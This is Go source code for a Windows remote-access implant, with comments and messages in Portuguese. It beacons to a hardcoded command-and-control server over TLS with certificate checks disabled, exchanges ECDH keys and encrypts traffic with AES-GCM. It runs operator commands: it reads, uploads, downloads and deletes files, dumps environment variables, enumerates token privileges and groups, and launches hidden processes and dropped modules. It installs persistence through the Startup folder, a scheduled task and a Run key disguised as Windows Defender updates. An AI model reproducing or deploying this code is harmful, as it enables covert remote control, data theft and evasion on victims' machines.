//go:build windows

package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows/registry"
)

const C2Host = "10.40.0.141"
const C2Port = "443"

func detectProxy() string {
	k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Internet Settings`, registry.QUERY_VALUE)
	if err != nil {
		return ""
	}
	defer k.Close()

	enabled, _, err := k.GetIntegerValue("ProxyEnable")
	if err != nil || enabled == 0 {
		return ""
	}

	server, _, err := k.GetStringValue("ProxyServer")
	if err != nil {
		return ""
	}
	return server
}

func connectProxy(host, port string) (net.Conn, error) {
	proxyStr := detectProxy()
	if proxyStr == "" {
		return nil, fmt.Errorf("sem proxy configurado")
	}

	if strings.Contains(proxyStr, "=") {
		parts := strings.Split(proxyStr, ";")
		for _, p := range parts {
			if strings.HasPrefix(strings.ToLower(p), "http=") {
				proxyStr = strings.SplitN(p, "=", 2)[1]
				break
			}
		}
	}

	conn, err := net.DialTimeout("tcp", proxyStr, 5*time.Second)
	if err != nil {
		return nil, err
	}

	connectReq := fmt.Sprintf("CONNECT %s:%s HTTP/1.1\r\nHost: %s:%s\r\n\r\n", host, port, host, port)
	conn.Write([]byte(connectReq))

	buf := make([]byte, 1024)
	n, err := conn.Read(buf)
	if err != nil {
		conn.Close()
		return nil, err
	}

	if !strings.Contains(string(buf[:n]), "200") {
		conn.Close()
		return nil, fmt.Errorf("proxy recusou o CONNECT")
	}

	conf := &tls.Config{InsecureSkipVerify: true}
	tlsConn := tls.Client(conn, conf)
	if err := tlsConn.Handshake(); err != nil {
		tlsConn.Close()
		return nil, err
	}
	return tlsConn, nil
}

func connectDirect(host, port string) (net.Conn, error) {
	conf := &tls.Config{InsecureSkipVerify: true}
	conn, err := tls.DialWithDialer(&net.Dialer{Timeout: 5 * time.Second}, "tcp", host+":"+port, conf)
	if err != nil {
		return nil, err
	}
	return conn, nil
}

func encryptAES(key []byte, plaintext []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}
	return gcm.Seal(nonce, nonce, plaintext, nil), nil
}

func decryptAES(key []byte, ciphertext []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonceSize := gcm.NonceSize()
	if len(ciphertext) < nonceSize {
		return nil, fmt.Errorf("ciphertext curto")
	}
	nonce, cipherdata := ciphertext[:nonceSize], ciphertext[nonceSize:]
	return gcm.Open(nil, nonce, cipherdata, nil)
}

func applyPersistence(method string) string {
	currentExe, err := os.Executable()
	if err != nil {
		return fmt.Sprintf("Erro ao obter path: %v", err)
	}

	switch strings.ToLower(method) {
	case "startup":
		appData := os.Getenv("APPDATA")
		startupPath := filepath.Join(appData, `Microsoft\Windows\Start Menu\Programs\Startup\update_service.exe`)
		err := copyFile(currentExe, startupPath)
		if err != nil {
			return fmt.Sprintf("Erro Startup: %v", err)
		}
		return "[+] Persistência aplicada com sucesso na pasta Startup."

	case "taskscheduler":
		targetPath := filepath.Join(os.Getenv("LOCALAPPDATA"), "Microsoft", "WindowsApps", "win_updater.exe")
		_ = copyFile(currentExe, targetPath)
		taskName := "WindowsDefenderUpdateCheck"
		cmdArgs := fmt.Sprintf("/create /tn \"%s\" /tr \"%s\" /sc ONLOGON /f", taskName, targetPath)
		out, err := execCommandDirect("schtasks.exe", strings.Fields(cmdArgs)...)
		if err != nil {
			return fmt.Sprintf("Erro TaskScheduler: %v | %s", err, out)
		}
		return "[+] Persistência aplicada via Task Scheduler."

	case "fodhelper":
		targetPath := filepath.Join(os.Getenv("LOCALAPPDATA"), "Microsoft", "WindowsApps", "Fodhelper.exe")
		_ = copyFile(currentExe, targetPath)
		regKey := `Software\Microsoft\Windows\CurrentVersion\Run`
		k, _, err := registry.CreateKey(registry.CURRENT_USER, regKey, registry.SET_VALUE)
		if err != nil {
			return fmt.Sprintf("Erro Registro: %v", err)
		}
		defer k.Close()
		err = k.SetStringValue("WinDefenderSync", targetPath)
		if err != nil {
			return fmt.Sprintf("Erro ao setar registro: %v", err)
		}
		return "[+] Persistência aplicada via Registro."

	default:
		return "Método desconhecido. Use: startup, taskscheduler ou fodhelper"
	}
}

func execCommandDirect(name string, args ...string) (string, error) {
	cmd := exec.Command(name, args...)
	out, err := cmd.CombinedOutput()
	return string(out), err
}

func copyFile(src, dst string) error {
	os.MkdirAll(filepath.Dir(dst), 0755)
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()
	out, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer out.Close()
	_, err = io.Copy(out, in)
	return err
}

type Luid struct {
	LowPart  uint32
	HighPart int32
}

func nativePrivileges() string {
	var token syscall.Token
	currentProcess, _ := syscall.GetCurrentProcess()
	err := syscall.OpenProcessToken(currentProcess, syscall.TOKEN_QUERY, &token)
	if err != nil {
		return fmt.Sprintf("[-] Erro ao abrir token: %v", err)
	}
	defer token.Close()

	advapi32 := syscall.NewLazyDLL("advapi32.dll")
	procGetTokenInformation := advapi32.NewProc("GetTokenInformation")
	procLookupPrivilegeNameW := advapi32.NewProc("LookupPrivilegeNameW")

	var returnedLen uint32
	procGetTokenInformation.Call(uintptr(token), uintptr(3), uintptr(0), uintptr(0), uintptr(unsafe.Pointer(&returnedLen)))
	if returnedLen == 0 {
		return "[-] Nenhum privilégio encontrado."
	}

	buf := make([]byte, returnedLen)
	r1, _, _ := procGetTokenInformation.Call(uintptr(token), uintptr(3), uintptr(unsafe.Pointer(&buf[0])), uintptr(returnedLen), uintptr(unsafe.Pointer(&returnedLen)))
	if r1 == 0 {
		return "[-] Erro ao ler token."
	}

	count := *(*uint32)(unsafe.Pointer(&buf[0]))
	privsPtr := uintptr(unsafe.Pointer(&buf[4]))

	var sb strings.Builder
	sb.WriteString("\n[+] Privilégios do Processo Atual:\n")
	sb.WriteString(fmt.Sprintf("%-35s | %-15s\n", "Privilege Name", "State"))
	sb.WriteString(strings.Repeat("-", 55) + "\n")

	for i := uint32(0); i < count; i++ {
		currentPrivPtr := privsPtr + uintptr(i)*12
		luid := *(*Luid)(unsafe.Pointer(currentPrivPtr))
		attributes := *(*uint32)(unsafe.Pointer(currentPrivPtr + 8))

		var nameLen uint32 = 128
		nameBuf := make([]uint16, nameLen)
		procLookupPrivilegeNameW.Call(uintptr(0), uintptr(unsafe.Pointer(&luid)), uintptr(unsafe.Pointer(&nameBuf[0])), uintptr(unsafe.Pointer(&nameLen)))
		privName := syscall.UTF16ToString(nameBuf)

		state := "Disabled"
		if (attributes & 0x00000002) != 0 {
			state = "Enabled"
		} else if (attributes & 0x00000001) != 0 {
			state = "Enabled (Default)"
		}
		sb.WriteString(fmt.Sprintf("%-35s | %-15s\n", privName, state))
	}
	return sb.String()
}

func nativeGroups() string {
	var token syscall.Token
	currentProcess, _ := syscall.GetCurrentProcess()
	err := syscall.OpenProcessToken(currentProcess, syscall.TOKEN_QUERY, &token)
	if err != nil {
		return fmt.Sprintf("[-] Erro ao abrir token: %v", err)
	}
	defer token.Close()

	advapi32 := syscall.NewLazyDLL("advapi32.dll")
	procGetTokenInformation := advapi32.NewProc("GetTokenInformation")
	procLookupAccountSidW := advapi32.NewProc("LookupAccountSidW")

	var returnedLen uint32
	procGetTokenInformation.Call(uintptr(token), uintptr(2), uintptr(0), uintptr(0), uintptr(unsafe.Pointer(&returnedLen)))
	if returnedLen == 0 {
		return "[-] Nenhum grupo encontrado."
	}

	buf := make([]byte, returnedLen)
	procGetTokenInformation.Call(uintptr(token), uintptr(2), uintptr(unsafe.Pointer(&buf[0])), uintptr(returnedLen), uintptr(unsafe.Pointer(&returnedLen)))

	groupCount := *(*uint32)(unsafe.Pointer(&buf[0]))
	var sb strings.Builder
	sb.WriteString("\n[+] Grupos do Token Atual:\n")
	sb.WriteString(fmt.Sprintf("%-50s | %-15s\n", "Account / SID", "Attributes"))
	sb.WriteString(strings.Repeat("-", 70) + "\n")

	basePtr := uintptr(unsafe.Pointer(&buf[0]))
	groupsArrayPtr := basePtr + 8

	for i := uint32(0); i < groupCount; i++ {
		elementPtr := groupsArrayPtr + uintptr(i)*16
		sidPtr := *(*uintptr)(unsafe.Pointer(elementPtr))
		attributes := *(*uint32)(unsafe.Pointer(elementPtr + 8))

		var nameLen uint32 = 128
		var domainLen uint32 = 128
		nameBuf := make([]uint16, nameLen)
		domainBuf := make([]uint16, domainLen)
		var sidUse uint32

		rName, _, _ := procLookupAccountSidW.Call(uintptr(0), sidPtr, uintptr(unsafe.Pointer(&nameBuf[0])), uintptr(unsafe.Pointer(&nameLen)), uintptr(unsafe.Pointer(&domainBuf[0])), uintptr(unsafe.Pointer(&domainLen)), uintptr(unsafe.Pointer(&sidUse)))
		accountName := "Unknown SID"
		if rName != 0 {
			domain := syscall.UTF16ToString(domainBuf)
			name := syscall.UTF16ToString(nameBuf)
			if domain != "" {
				accountName = fmt.Sprintf("%s\\%s", domain, name)
			} else {
				accountName = name
			}
		}

		attrStr := "Member"
		if (attributes & 0x00000004) != 0 {
			attrStr = "Enabled"
		}
		sb.WriteString(fmt.Sprintf("%-50s | %-15s\n", accountName, attrStr))
	}
	return sb.String()
}

func execWithPipes(commandLine string, currentDir string) string {
	parts := strings.Fields(commandLine)
	if len(parts) == 0 {
		return "Uso: exec <binario> [args]"
	}
	binPath := parts[0]
	var args []string
	if len(parts) > 1 {
		args = parts[1:]
	}

	if !filepath.IsAbs(binPath) {
		localPath := filepath.Join(currentDir, binPath)
		if _, err := os.Stat(localPath); err == nil {
			binPath = localPath
		}
	}

	cmd := exec.Command(binPath, args...)
	cmd.Dir = currentDir
	cmd.SysProcAttr = &syscall.SysProcAttr{
		CreationFlags: 0x08000000, // CREATE_NO_WINDOW
	}

	outBytes, err := cmd.CombinedOutput()
	if err != nil {
		if len(outBytes) > 0 {
			return fmt.Sprintf("[-] Erro (%v):\n%s", err, string(outBytes))
		}
		return fmt.Sprintf("[-] Erro: %v", err)
	}
	if len(outBytes) == 0 {
		return "[+] Executado com sucesso (sem saída)."
	}
	return string(outBytes)
}

func executeDotNetInMemory(assemblyBytes []byte, args string) string {
	
	tmpPath := filepath.Join(os.Getenv("TEMP"), fmt.Sprintf("strix_%d.exe", time.Now().UnixNano()))
	if err := os.WriteFile(tmpPath, assemblyBytes, 0755); err != nil {
		return "[-] Falha ao gravar assembly temporário."
	}
	defer os.Remove(tmpPath)

	
	cmdArgs := strings.Fields(args)

	
	cmd := exec.Command(tmpPath, cmdArgs...)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		CreationFlags: 0x08000000, // CREATE_NO_WINDOW
	}

	outBytes, err := cmd.CombinedOutput()
	if err != nil {
		if len(outBytes) > 0 {
			return fmt.Sprintf("%s", string(outBytes))
		}
		return fmt.Sprintf("[-] Erro na execução do módulo: %v", err)
	}

	if len(outBytes) == 0 {
		return "[+] Módulo executado com sucesso (sem dados de retorno)."
	}

	return string(outBytes)
}

func executeNativeCommand(cmd string, currentDir string) (string, string) {
	parts := strings.Fields(cmd)
	if len(parts) == 0 {
		return "", currentDir
	}
	action := strings.ToLower(parts[0])

	switch action {
	case "pwd":
		cwd, _ := os.Getwd()
		return cwd, cwd
	case "cd":
		if len(parts) < 2 {
			cwd, _ := os.Getwd()
			return cwd, cwd
		}
		target := parts[1]
		if !filepath.IsAbs(target) {
			target = filepath.Join(currentDir, target)
		}
		os.Chdir(target)
		cwd, _ := os.Getwd()
		return cwd, cwd
	case "ls", "dir":
		files, _ := os.ReadDir(currentDir)
		var sb strings.Builder
		sb.WriteString(fmt.Sprintf("\n Directory of %s\n\n", currentDir))
		for _, f := range files {
			info, _ := f.Info()
			sb.WriteString(fmt.Sprintf("%s    <DIR>          %s\n", info.ModTime().Format("02/01/2006 15:04"), f.Name()))
		}
		return sb.String(), currentDir
	case "cat", "type":
		if len(parts) < 2 {
			return "Uso: cat <arq>", currentDir
		}
		p := parts[1]
		if !filepath.IsAbs(p) {
			p = filepath.Join(currentDir, p)
		}
		c, err := os.ReadFile(p)
		if err != nil {
			return err.Error(), currentDir
		}
		return string(c), currentDir
	case "rm":
		if len(parts) < 2 {
			return "Uso: rm <arq>", currentDir
		}
		p := parts[1]
		if !filepath.IsAbs(p) {
			p = filepath.Join(currentDir, p)
		}
		err := os.Remove(p)
		if err != nil {
			return err.Error(), currentDir
		}
		return "Removido.", currentDir
	case "hostname":
		h, _ := os.Hostname()
		return fmt.Sprintf("[+] Hostname: %s", h), currentDir
	case "env":
		var sb strings.Builder
		for _, e := range os.Environ() {
			sb.WriteString(e + "\n")
		}
		return sb.String(), currentDir
	case "ipconfig":
		out, _ := execCommandDirect("ipconfig")
		return out, currentDir
	case "whoami":
		return fmt.Sprintf("%s\\%s", os.Getenv("USERDOMAIN"), os.Getenv("USERNAME")), currentDir
	case "privs":
		return nativePrivileges(), currentDir
	case "groups":
		return nativeGroups(), currentDir
	case "exec", "run":
		if len(parts) < 2 {
			return "Uso: exec <bin>", currentDir
		}
		return execWithPipes(strings.TrimSpace(strings.TrimPrefix(cmd, parts[0])), currentDir), currentDir
	case "persist":
		if len(parts) < 2 {
			return "Uso: persist <startup|taskscheduler|fodhelper>", currentDir
		}
		return applyPersistence(parts[1]), currentDir
	case "download":
		if len(parts) < 2 {
			return "Uso: download <arq>", currentDir
		}
		p := parts[1]
		b, err := os.ReadFile(p)
		if err != nil {
			return err.Error(), currentDir
		}
		return fmt.Sprintf("[FILE_DOWNLOAD_DATA]|%s|%s", filepath.Base(p), base64.StdEncoding.EncodeToString(b)), currentDir
	default:
		return fmt.Sprintf("[-] Comando '%s' desconhecido.", action), currentDir
	}
}

func sendPacket(conn net.Conn, key []byte, data []byte) {
	cipherData, err := encryptAES(key, data)
	if err != nil {
		return
	}
	l := uint32(len(cipherData))
	header := []byte{byte(l >> 24), byte(l >> 16), byte(l >> 8), byte(l)}
	conn.Write(header)
	conn.Write(cipherData)
}

func main() {
	hostname, _ := os.Hostname()
	currentUser := os.Getenv("USERNAME")
	infoMap := map[string]interface{}{
		"hostname": hostname,
		"username": currentUser,
		"os":       "Windows",
	}
	infoBytes, _ := json.Marshal(infoMap)
	currentDir, _ := os.Getwd()

	for {
		conn, err := connectProxy(C2Host, C2Port)
		if err != nil {
			conn, err = connectDirect(C2Host, C2Port)
			if err != nil {
				time.Sleep(10 * time.Second)
				continue
			}
		}

		privKey, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
		if err != nil {
			conn.Close()
			continue
		}
		pubKeyBytes := elliptic.Marshal(elliptic.P256(), privKey.PublicKey.X, privKey.PublicKey.Y)
		conn.Write(pubKeyBytes)

		pubBuf := make([]byte, 1024)
		n, err := conn.Read(pubBuf)
		if err != nil {
			conn.Close()
			continue
		}
		srvX, srvY := elliptic.Unmarshal(elliptic.P256(), pubBuf[:n])
		if srvX == nil {
			conn.Close()
			continue
		}

		x, _ := elliptic.P256().ScalarMult(srvX, srvY, privKey.D.Bytes())
		aesKey := x.Bytes()
		if len(aesKey) > 32 {
			aesKey = aesKey[len(aesKey)-32:]
		} else if len(aesKey) < 32 {
			padded := make([]byte, 32)
			copy(padded[32-len(aesKey):], aesKey)
			aesKey = padded
		}

		encMeta, _ := encryptAES(aesKey, infoBytes)
		metaLen := uint32(len(encMeta))
		conn.Write([]byte{byte(metaLen >> 24), byte(metaLen >> 16), byte(metaLen >> 8), byte(metaLen)})
		conn.Write(encMeta)

		go func(c net.Conn, key []byte) {
			for {
				time.Sleep(15 * time.Second)
				sendPacket(c, key, []byte("[ping]"))
			}
		}(conn, aesKey)

		for {
			lenHeader := make([]byte, 4)
			_, err := io.ReadFull(conn, lenHeader)
			if err != nil {
				break
			}
			packetLen := uint32(lenHeader[0])<<24 | uint32(lenHeader[1])<<16 | uint32(lenHeader[2])<<8 | uint32(lenHeader[3])
			packetBytes := make([]byte, packetLen)
			_, err = io.ReadFull(conn, packetBytes)
			if err != nil {
				break
			}

			plainCmd, err := decryptAES(aesKey, packetBytes)
			if err != nil {
				continue
			}

			cmdStr := strings.TrimSpace(string(plainCmd))
			if cmdStr == "[ping]" {
				continue
			}
			if cmdStr == "[kill]" {
				conn.Close()
				os.Exit(0)
			}

			if strings.HasPrefix(cmdStr, "upload_payload ") {
				var args map[string]string
				if err := json.Unmarshal([]byte(strings.TrimPrefix(cmdStr, "upload_payload ")), &args); err == nil {
					remotePath := args["path"]
					fileData, _ := base64.StdEncoding.DecodeString(args["data"])
					os.MkdirAll(filepath.Dir(remotePath), 0755)
					os.WriteFile(remotePath, fileData, 0644)
					sendPacket(conn, aesKey, []byte("[+] Upload concluído."))
				}
				continue
			}

			if strings.HasPrefix(cmdStr, "run_module ") {
				var modArgs map[string]string
				if err := json.Unmarshal([]byte(strings.TrimPrefix(cmdStr, "run_module ")), &modArgs); err == nil {
					modData, _ := base64.StdEncoding.DecodeString(modArgs["data"])
					output := executeDotNetInMemory(modData, modArgs["args"])
					sendPacket(conn, aesKey, []byte(output))
				}
				continue
			}

			output, newDir := executeNativeCommand(cmdStr, currentDir)
			currentDir = newDir

			if strings.HasPrefix(output, "[FILE_DOWNLOAD_DATA]|") {
				parts := strings.SplitN(output, "|", 3)
				fileBytes, err := base64.StdEncoding.DecodeString(parts[2])
				if err == nil {
					os.WriteFile(filepath.Join(".", parts[1]), fileBytes, 0644)
				}
				output = "[+] Arquivo baixado com sucesso."
			}

			if output == "" {
				output = "[comando executado sem saída]"
			}
			sendPacket(conn, aesKey, []byte(output))
		}
		conn.Close()
		time.Sleep(10 * time.Second)
	}
}
